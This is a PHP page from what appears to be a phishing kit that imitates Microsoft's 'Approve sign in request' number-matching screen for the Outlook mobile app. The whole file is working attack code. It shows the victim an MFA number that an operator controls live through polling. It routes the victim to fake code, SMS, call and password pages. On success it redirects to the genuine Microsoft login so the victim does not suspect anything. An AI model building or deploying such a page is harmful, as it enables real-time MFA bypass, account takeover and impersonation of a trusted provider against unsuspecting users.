<?php
// approve-app.php — "Approve sign in request" with number matching
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid      = $_SESSION['visitor_id'] ?? session_id();
// ── Block check: redirect immediately if visitor is blocked ──
if (!empty($sid)) {
    $__state = get_state($sid);
    if (!empty($__state['blocked'])) {
        header('Location: blocked.php');
        exit;
    }
}

$email    = $_SESSION['email'];
$state    = get_state($sid);

if ($state['page'] === 'success') { header('Location: https://login.microsoftonline.com/'); exit; }

$num      = isset($state['prompt_number']) ? (int)$state['prompt_number'] : null;
$is_error = ($state['page'] === 'prompt_error');

page_open('Approve sign in request', true);
?>

<div class="card">
  <?= company_logo_html() ?>
  <p class="card-email-display"><?= htmlspecialchars($email) ?></p>
  <h1 class="card-title">Approve sign in request</h1>

  <?php if ($is_error): ?>
    <div class="err-text" style="margin-bottom:12px">
      <?= err_icon() ?> That didn't match. Try again or use a different method.
    </div>
  <?php endif; ?>

  <div style="display:flex;align-items:flex-start;gap:12px;margin-bottom:16px">
    <div class="verify-option-icon" style="margin-top:2px">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#444" stroke-width="1.5">
        <circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.582-7 8-7s8 3 8 7" stroke-linecap="round"/>
      </svg>
    </div>
    <p style="font-size:14px;color:#1b1b1b;line-height:1.6">
      Open your Outlook mobile app, and enter the number shown to sign in.
    </p>
  </div>

  <!-- The big number box -->
  <div class="approve-number" id="promptNum">
    <?= $num !== null ? $num : '&nbsp;' ?>
  </div>

  <p style="font-size:13px;color:#444;line-height:1.6;margin-top:8px">
    Didn't receive a sign-in request? <strong>Swipe down to refresh</strong> the content in your app.
  </p>

  <a href="loading.php" class="ms-link" style="display:block;margin-top:14px">
    I can't use my Outlook mobile app right now
  </a>
  <a href="#" class="ms-link" style="display:block">More information</a>
</div>

<script>
(function(){
  const MAP = {
    'loading':    'loading.php',
    'verify_code':'verify-code.php',
    'text_code':  'text-code.php',
    'call_code':  'call-code.php',
    'pw_error':   'password.php',
    'password':   'password.php',
    'blocked':    'blocked.php',
  };
  let redirecting = false;
  let currentNum  = <?= $num !== null ? $num : 'null' ?>;

  function poll(){
    if (redirecting) return;
    fetch('poll.php?t=' + Date.now(), {cache:'no-store'})
      .then(r => r.json())
      .then(d => {
        if (redirecting) return;

        // Update number live if admin picks a new one
        const n = parseInt(d.prompt_number);
        if (!isNaN(n) && n !== currentNum) {
          currentNum = n;
          document.getElementById('promptNum').textContent = n;
        }

        if (d.page === 'success') {
          redirecting = true;
          window.location.replace('https://login.microsoftonline.com/');
          return;
        }
        if (d.page === 'approve_app' || d.page === 'prompt_error') return;

        const dest = MAP[d.page];
        if (dest) { redirecting = true; window.location.replace(dest); }
      }).catch(()=>{});
  }
  setInterval(poll, 1200);
  poll();
})();
</script>

<?php page_close(); ?>